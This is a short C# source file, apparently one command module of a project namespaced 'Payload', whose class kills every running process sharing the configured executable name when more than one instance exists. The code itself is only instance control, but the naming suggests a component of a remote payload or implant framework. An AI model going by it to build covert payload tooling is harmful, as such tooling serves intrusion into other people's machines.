using Payload.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command
{
    public class KillOtherMeCommand : Payload.Command.Interface.ICommand
    {
        public override Task Execute()
        {
            var pList = Process.GetProcessesByName(Config.Instance.ExeName.Split('.')[0]);
            if (pList.Length > 1)
                foreach (var process in pList)
                    process.Kill();
            return null;
        }
    }
}
